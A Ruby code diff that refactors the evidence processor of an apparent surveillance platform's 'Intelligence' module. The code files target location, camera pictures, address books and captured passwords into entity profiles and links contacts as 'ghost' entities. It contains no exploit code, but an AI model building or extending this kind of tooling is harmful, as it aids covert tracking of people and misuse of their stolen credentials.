@@ -9,6 +9,11 @@ require 'rcs-common/fixnum'
 require 'rcs-common/sanitize'
 require 'fileutils'
 
+require_relative 'accounts'
+require_relative 'camera'
+require_relative 'position'
+require_relative 'ghost'
+
 module RCS
 module Intelligence
 
@@ -33,45 +38,36 @@ class Processor
 
 
   def self.process(entry)
-    ev = Evidence.collection_class(entry['target_id']).find(entry['evidence_id'])
+    evidence = Evidence.collection_class(entry['target_id']).find(entry['evidence_id'])
+
+    # respect the license
+    return if ['position', 'camera'].include? evidence.type and not $license['correlation']
+
     entity = Entity.any_in({path: [Moped::BSON::ObjectId.from_string(entry['target_id'])]}).first
 
-    trace :info, "Processing #{ev.type} for entity #{entity.name}"
+    trace :info, "Processing #{evidence.type} for entity #{entity.name}"
 
-    # save the last position of the entity
-    save_last_position(ev, entity) if ev.type.eql? 'position'
-
-    # save picture of the target
-    save_first_camera(ev, entity) if ev.type.eql? 'camera'
+    case evidence.type
+      when 'position'
+        # save the last position of the entity
+        Position.save_last_position(entity, evidence)
+      when 'camera'
+        # save picture of the target
+        Camera.save_first_camera(entity, evidence)
+      when 'addressbook'
+        # analyze the accounts
+        Accounts.add_handle(entity, evidence)
+        # create a ghost entity and link it as :know
+        Ghost.create_and_link_entity(entity, Accounts.get_addressbook_handle(evidence)) if $license['intelligence']
+      when 'password'
+        # analyze the accounts
+        Accounts.add_handle(entity, evidence)
+    end
 
   rescue Exception => e
     trace :error, "Cannot process evidence: #{e.message}"
     trace :fatal, e.backtrace.join("\n")
   end
-
-
-  def self.save_last_position(evidence, entity)
-    return if evidence[:data]['latitude'].nil? or evidence[:data]['longitude'].nil?
-
-    entity.last_position = {latitude: evidence[:data]['latitude'].to_f,
-                            longitude: evidence[:data]['longitude'].to_f,
-                            time: evidence[:da],
-                            accuracy: evidence[:data]['accuracy'].to_i}
-    entity.save
-
-    trace :info, "Saving last position for #{entity.name}: #{entity.last_position.inspect}"
-  end
-
-
-  def self.save_first_camera(evidence, entity)
-    return unless entity.photos.empty?
-
-    file = RCS::DB::GridFS.get(evidence.data['_grid'], entity.path.last.to_s)
-    entity.add_photo(file.read)
-
-    trace :info, "Saving first camera picture for #{entity.name}"
-  end
-
 
 end
 
